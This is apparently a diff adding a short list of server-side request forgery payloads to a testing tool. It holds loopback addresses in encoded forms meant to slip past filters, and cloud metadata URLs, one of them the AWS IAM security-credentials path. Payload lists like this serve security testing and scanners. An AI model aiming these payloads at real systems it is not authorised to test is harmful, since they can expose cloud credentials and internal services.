@@ -1,0 +1,17 @@
+# SSRF target URLs / bypasses.
+# Derived from swisskyrepo/PayloadsAllTheThings (Server Side Request Forgery/)
+# and HackTricks SSRF notes. Covers loopback, decimal/octal IP, IPv6, and the
+# AWS/GCP link-local metadata service. Point a URL param at one of these and
+# check the SSRF oracle (reflected canary or metadata fingerprint).
+http://127.0.0.1/
+http://127.1/
+http://0.0.0.0/
+http://localhost/
+http://2130706433/
+http://0x7f000001/
+http://[::1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/latest/api/token
